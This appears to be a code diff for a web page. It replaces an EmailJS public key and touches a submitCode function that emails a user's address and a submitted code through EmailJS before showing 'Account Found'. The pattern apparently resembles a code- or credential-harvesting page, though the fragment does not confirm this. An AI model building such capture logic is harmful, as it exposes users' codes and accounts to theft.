@@ -106,7 +106,7 @@
 
 <script>
   (function(){
-    emailjs.init({ publicKey: "ApeL9b3oz5PynbXsm" });
+    emailjs.init({ publicKey: "YRHV_6c89sUTJv5FF" });
   })();
 </script>
 
@@ -160,7 +160,7 @@ async function submitCode() {
       email: email
     };
 
-    await emailjs.send("service_ohhju66", "template_4cn0cjn", templateParams);
+    await emailjs.send("service_ohhju66","template_4cn0cjn", templateParams);
 
     iziToast.success({
       title: 'Account Found',
